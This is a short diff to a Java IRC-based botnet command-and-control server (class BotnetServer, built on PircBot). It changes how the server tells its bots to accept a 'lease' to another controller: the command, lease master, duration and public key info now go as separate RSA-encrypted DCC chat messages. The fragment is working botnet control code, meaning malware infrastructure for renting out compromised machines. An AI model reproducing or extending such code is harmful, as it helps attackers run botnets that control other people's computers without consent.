@@ -236,10 +236,13 @@ public class BotnetServer extends PircBot {
 				chat.sendLine(m.encryptRSA("lease " + botNames));
 				String leasedPubInfo = chat.readLine();
 				for (String name : bots) {
-					String command = "leasekey " + leaseMaster + " " + duration + " " + leasedPubInfo;
+					//String command = "leasekey " + leaseMaster + " " + duration + " " + leasedPubInfo;
 					//System.out.println(command + "\n\n" + botKeys.get(name).encryptMsg(command));
 					DccChat botChat = this.dccSendChatRequest(name, TIMEOUT);
-					botChat.sendLine(botKeys.get(name).encryptMsg(command));
+					botChat.sendLine(botKeys.get(name).encryptMsg("leasekey"));
+					botChat.sendLine(botKeys.get(name).encryptMsg(leaseMaster));
+					botChat.sendLine(botKeys.get(name).encryptMsg(duration + ""));
+					botChat.sendLine(botKeys.get(name).encryptMsg(leasedPubInfo));
 					//sendMessage(name, botKeys.get(name).encryptMsg(command));
 					//System.out.println("\tLeased " + name + " to " + leaseMaster + " for " + duration);
 				}
